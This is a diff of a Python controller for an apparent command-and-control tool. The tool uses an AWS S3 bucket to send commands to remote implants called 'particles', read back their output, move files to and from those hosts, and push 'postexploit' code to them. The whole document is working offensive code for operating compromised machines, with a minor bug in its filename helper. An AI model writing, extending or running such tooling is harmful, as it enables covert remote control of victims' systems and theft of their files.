@@ -29,212 +29,265 @@ def getparticlelist(profile, bucket_name, particles):
                 f"[*] Error: {sys.exc_info()[1]}", "red"
             )
         )
+
+def findFileName(filePath):
+    if '/' in filePath:
+        return filePath.split('/')[-1]
+    elif '/' in filePath:
+        return filePath.split('\\')[-1]
+    else:
+        return filePath
+
+def uploadFile(bucket_name, particle_name, sourceFile, s3Client, kmskeyid):
+    fileName = findFileName(sourceFile)
+
+    with open(sourceFile, 'rb') as sourceFileObj:
+        s3Client.put_object(
+            Bucket=bucket_name,
+            Key=f"{particle_name}/{fileName}",
+            Body=base64.b64encode(sourceFileObj.read()),
+            SSEKMSKeyId=kmskeyid,
+            ServerSideEncryption='aws:kms',
+            ContentType="text/plain"
+        )
+    sourceFileObj.close()
+    """s3Client.delete_object(
+        Bucket=bucket_name,
+        Key=f"{particle_name}/{fileName}",
+        # SSEKMSKeyId=kmskeyid,
+        # ServerSideEncryption ='aws:kms'
+    )"""
+
+def downloadFile(bucket_name, particle_name, sourcePath, destinationPath, s3Client):
+    fileName = findFileName(sourcePath)
+
+    with open(destinationPath, 'wb') as destinationPathObj:
+        destinationPathObj.write(
+            s3Client.get_object(
+                Bucket=bucket_name,
+                Key=f"{particle_name}/{fileName}",
+                # SSEKMSKeyId=kmskeyid,
+                # ServerSideEncryption ='aws:kms'
+            )['Body'].read()
+        )
+    destinationPathObj.close()
+
+    s3Client.delete_object(
+        Bucket=bucket_name,
+        Key=f"{particle_name}/{fileName}",
+        # SSEKMSKeyId=kmskeyid,
+        # ServerSideEncryption ='aws:kms'
+    )
+
+def printOutput(bucket_name, particle_name, sourcePath, s3Client):
+    fileName = findFileName(sourcePath)
+
+    print(
+        s3Client.get_object(
+            Bucket=bucket_name,
+            Key=f"{particle_name}/{fileName}",
+            # SSEKMSKeyId=kmskeyid,
+            # ServerSideEncryption ='aws:kms'
+        )['Body'].read()
+    )
+
+    s3Client.delete_object(
+        Bucket=bucket_name,
+        Key=f"{particle_name}/{fileName}",
+        # SSEKMSKeyId=kmskeyid,
+        # ServerSideEncryption ='aws:kms'
+    )
+
 def getsendcommand(bucket_name, particle_name, command_key, output_key, command, s3Client, kmskeyid, particles):
-    testparticle = 0
     try:
-        bucketObjectsReq = s3Client.list_objects_v2(Bucket=bucket_name)
+        print("Previous command output: " + s3Client.get_object(
+            Bucket=bucket_name,
+            Key=f"{particle_name}/{output_key}",
+            # SSEKMSKeyId=kmskeyid,
+            # ServerSideEncryption ='aws:kms'
+        )['Body'].read().decode())
+    except:
+        pass
 
-        if 'Contents' in bucketObjectsReq:
-            bucketObjects = bucketObjectsReq['Contents']
-            objcheck = 0
-            for object in bucketObjects:
-                if object['Key'] == f"{particle_name}/{output_key}":
-                    objcheck = 1
-                    '''
+    try:
+        s3Client.delete_object(
+            Bucket=bucket_name,
+            Key=f"{particle_name}/{output_key}",
+            # SSEKMSKeyId=kmskeyid,
+            # ServerSideEncryption ='aws:kms'
+        )
+
+        s3Client.delete_object(
+            Bucket=bucket_name,
+            Key=f"{particle_name}/{command_key}",
+            #SSEKMSKeyId=kmskeyid,
+            #ServerSideEncryption ='aws:kms'
+        )
+
+        if len(command.split(" ")) == 2:
+            if command.split(" ")[0] == 'postexploit':
+                if not os.path.exists(command.split(" ")[1]):
+                    print(colored(f"Error: File {command.split(' ')[1]} does not exist", "red"))
+                else:
                     try:
-                        print(s3Client.get_object(
-                            Bucket=bucket_name,
-                            Key=f"{particle_name}/{output_key}",
-                            # SSEKMSKeyId=kmskeyid,
-                            # ServerSideEncryption ='aws:kms'
-                        )['Body'].read().decode())
+                        with open(command.split(" ")[1], 'rb') as postexpfileobj:
+                            command = f"{command.split(' ')[0]} {base64.b64encode(postexpfileobj.read()).decode()}"
                     except Exception as e:
-                        pass
-                    '''
-                    s3Client.delete_object(
-                        Bucket=bucket_name,
-                        Key=f"{particle_name}/{output_key}",
-                        # SSEKMSKeyId=kmskeyid,
-                        # ServerSideEncryption ='aws:kms'
-                    )
+                        print(str(e))
+                        return
 
-                    s3Client.delete_object(
-                        Bucket=bucket_name,
-                        Key=f"{particle_name}/{command_key}",
-                        #SSEKMSKeyId=kmskeyid,
-                        #ServerSideEncryption ='aws:kms'
-                    )
-
-                    with open("/tmp/command", "w") as cf:
-                        cf.write(command)
-                        cf.close()
-
-                    with open("/tmp/command", "rb") as f:
-                        s3Client.put_object(
-                            Bucket=bucket_name,
-                            Key=f"{particle_name}/{command_key}",
-                            Body=base64.b64encode(f.read()),
-                            SSEKMSKeyId = kmskeyid,
-                            ServerSideEncryption ='aws:kms',
-                            ContentType="text/plain"
+                    '''try:
+                        uploadFile(
+                            bucket_name=bucket_name,
+                            kmskeyid=kmskeyid,
+                            particle_name=particle_name,
+                            sourceFile=command.split(" ")[1],
+                            s3Client=s3Client
                         )
+                    except Exception as e:
+                        print(
+                            colored(f"Error uploading go code: {str(e)}", "red")
+                        )
+                        return'''
+
+        if len(command.split(" ")) == 3:
+            if command.split(" ")[0] == 'upload':
+                try:
+                    uploadFile(
+                        bucket_name=bucket_name,
+                        kmskeyid=kmskeyid,
+                        particle_name=particle_name,
+                        sourceFile=command.split(" ")[1],
+                        s3Client=s3Client
+                    )
+                except Exception as e:
+                    print(
+                        colored(f"Error uploading go code: {str(e)}", "red")
+                    )
+                    return
+
+        s3Client.put_object(
+            Bucket=bucket_name,
+            Key=f"{particle_name}/{command_key}",
+            Body=base64.b64encode(command.encode()),
+            SSEKMSKeyId = kmskeyid,
+            ServerSideEncryption ='aws:kms',
+            ContentType="text/plain"
+        )
+
+        print(
+            colored(
+                f"[*] Uploaded command to bucket", "green"
+            )
+        )
+    except Exception as e:
+        print(
+            colored(f"Error uploading the command: {str(e)}")
+        )
+
+    testparticle = 0
+    postexploittest = 0
+
+    if command.split(" ")[0] == 'postexploit':
+        print(
+            colored(
+                f"[*] Printing output of code {command.split(' ')[1]}...", "yellow"
+            )
+        )
+    elif command.split(" ")[0] == 'download':
+        print(
+            colored(
+                f"[*] Downloading file {command.split(' ')[1]} to {command.split(' ')[2]}...", "yellow"
+            )
+        )
+    elif command.split(" ")[0] == 'upload':
+        print(
+            colored(
+                f"[*] Uploading file {command.split(' ')[1]} to {command.split(' ')[2]}...", "yellow"
+            )
+        )
+
+    while True:
+        try:
+            '''if len(command.split(" ")) == 2:
+                if command.split(" ")[0] == 'postexploit':
+                    time.sleep(5)
+                    while postexploittest <= 60:
+                        try:
+                            printOutput(
+                                bucket_name=bucket_name,
+                                particle_name=particle_name,
+                                sourcePath=f"{command.split(' ')[1]}.output",
+                                s3Client=s3Client
+                            )
+
+                        except Exception as e:
+                            print(str(e))
+                            postexploittest += 5
+                            time.sleep(5)'''
+
+
+            if len(command.split(" ")) == 3:
+                if command.split(" ")[0] == 'download':
+                    downloadFile(
+                        bucket_name=bucket_name,
+                        particle_name=particle_name,
+                        sourcePath=command.split(" ")[1],
+                        destinationPath=command.split(" ")[2],
+                        s3Client=s3Client
+                    )
 
                     print(
                         colored(
-                            f"[*] Uploaded command to bucket", "green"
+                            f"[*] Downloaded file {command.split(' ')[1]} to {command.split(' ')[2]}", "green"
                         )
                     )
-                    os.remove("/tmp/command")
 
-                    while True:
-                        try:
-                            print(s3Client.get_object(
-                                Bucket=bucket_name,
-                                Key=f"{particle_name}/{output_key}",
-                                # SSEKMSKeyId=kmskeyid,
-                                # ServerSideEncryption ='aws:kms'
-                            )['Body'].read().decode())
-
-                            s3Client.delete_object(
-                                Bucket=bucket_name,
-                                Key=f"{particle_name}/{output_key}",
-                                # SSEKMSKeyId=kmskeyid,
-                                # ServerSideEncryption ='aws:kms'
-                            )
-
-                            s3Client.delete_object(
-                                Bucket=bucket_name,
-                                Key=f"{particle_name}/{command_key}",
-                                # SSEKMSKeyId=kmskeyid,
-                                # ServerSideEncryption ='aws:kms'
-                            )
-                            break
-                        except Exception as e:
-                            time.sleep(5)
-                            testparticle += 5
-                            if testparticle == 30:
-                                deleteparticle(s3Client, particle_name, bucket_name, command_key, output_key, particles)
-                                particle_name = ""
-                                break
-                            pass
-
-            if objcheck == 0:
-                with open("/tmp/command", "w") as cf:
-                    cf.write(command)
-                    cf.close()
-
-                with open("/tmp/command", "rb") as f:
-
-                    s3Client.put_object(
-                        Bucket=bucket_name,
-                        Key=f"{particle_name}/{command_key}",
-                        Body=base64.b64encode(f.read()),
-                        SSEKMSKeyId=kmskeyid,
-                        ServerSideEncryption ='aws:kms',
-                        ContentType="text/plain"
-                        #ContentEncoding="text/plain"
+                elif command.split(" ")[0] == 'upload':
+                    uploadFile(
+                        bucket_name=bucket_name,
+                        particle_name=particle_name,
+                        sourceFile=command.split(" ")[1],
+                        s3Client=s3Client,
+                        kmskeyid=kmskeyid
                     )
 
-                print(
-                    colored(
-                        f"[*] Uploaded command to bucket", "green"
+                    print(
+                        colored(
+                            f"[*] Uploaded file {command.split(' ')[1]} to {command.split(' ')[2]}", "green"
+                        )
                     )
-                )
-                os.remove("/tmp/command")
-                while True:
-                    try:
-                        print(s3Client.get_object(
-                            Bucket=bucket_name,
-                            Key=f"{particle_name}/{output_key}",
-                            #SSEKMSKeyId=kmskeyid,
-                            #ServerSideEncryption ='aws:kms'
-                        )['Body'].read().decode())
 
-                        s3Client.delete_object(
-                            Bucket=bucket_name,
-                            Key=f"{particle_name}/{output_key}",
-                            # SSEKMSKeyId=kmskeyid,
-                            # ServerSideEncryption ='aws:kms'
-                        )
+            print(s3Client.get_object(
+                Bucket=bucket_name,
+                Key=f"{particle_name}/{output_key}",
+                # SSEKMSKeyId=kmskeyid,
+                # ServerSideEncryption ='aws:kms'
+            )['Body'].read().decode())
 
-                        s3Client.delete_object(
-                            Bucket=bucket_name,
-                            Key=f"{particle_name}/{command_key}",
-                            # SSEKMSKeyId=kmskeyid,
-                            # ServerSideEncryption ='aws:kms'
-                        )
-
-                        break
-                    except Exception as e:
-                        time.sleep(5)
-                        testparticle += 5
-                        if testparticle == 30:
-                            deleteparticle(s3Client, particle_name, bucket_name, command_key, output_key, particles)
-                            particle_name = ""
-                            break
-                        pass
-
-        else:
-            with open("/tmp/command", "w") as cf:
-                cf.write(command)
-                cf.close()
-
-            with open("/tmp/command", "rb") as f:
-                s3Client.put_object(
-                    Bucket=bucket_name,
-                    Key=f"{particle_name}/{command_key}",
-                    Body=base64.b64encode(f.read()),
-                    SSEKMSKeyId=kmskeyid,
-                    ServerSideEncryption ='aws:kms',
-                    ContentType="text/plain"
-                )
-
-            print(
-                colored(
-                    f"[*] Uploaded command to bucket", "green"
-                )
+            s3Client.delete_object(
+                Bucket=bucket_name,
+                Key=f"{particle_name}/{output_key}",
+                # SSEKMSKeyId=kmskeyid,
+                # ServerSideEncryption ='aws:kms'
             )
-            os.remove("/tmp/command")
-            while True:
-                try:
-                    print(s3Client.get_object(
-                        Bucket=bucket_name,
-                        Key=f"{particle_name}/{output_key}",
-                        # SSEKMSKeyId=kmskeyid,
-                        # ServerSideEncryption ='aws:kms'
-                    )['Body'].read().decode())
 
-                    s3Client.delete_object(
-                        Bucket=bucket_name,
-                        Key=f"{particle_name}/{output_key}",
-                        # SSEKMSKeyId=kmskeyid,
-                        # ServerSideEncryption ='aws:kms'
-                    )
+            """s3Client.delete_object(
+                Bucket=bucket_name,
+                Key=f"{particle_name}/{command_key}",
+                # SSEKMSKeyId=kmskeyid,
+                # ServerSideEncryption ='aws:kms'
+            )"""
 
-                    s3Client.delete_object(
-                        Bucket=bucket_name,
-                        Key=f"{particle_name}/{command_key}",
-                        # SSEKMSKeyId=kmskeyid,
-                        # ServerSideEncryption ='aws:kms'
-                    )
-
-                    break
-                except Exception as e:
-                    time.sleep(5)
-                    testparticle += 5
-                    if testparticle == 90:
-                        deleteparticle(s3Client, particle_name, bucket_name, command_key, output_key, particles)
-                        particle_name = ""
-                        break
-                    pass
-
-
-    except Exception as e:
-        print(
-            colored(
-                f"[*] Error: {sys.exc_info()[1]}", "red"
-            )
-        )
+            break
+        except Exception as e:
+            time.sleep(5)
+            testparticle += 5
+            if testparticle == 60:
+                deleteparticle(s3Client, particle_name, bucket_name, command_key, output_key, particles)
+                particle_name = ""
+                break
+            pass
 
 def deleteparticle(s3Client, particle_name, bucket_name, commandfile, outputfile, particles):
     print(colored(
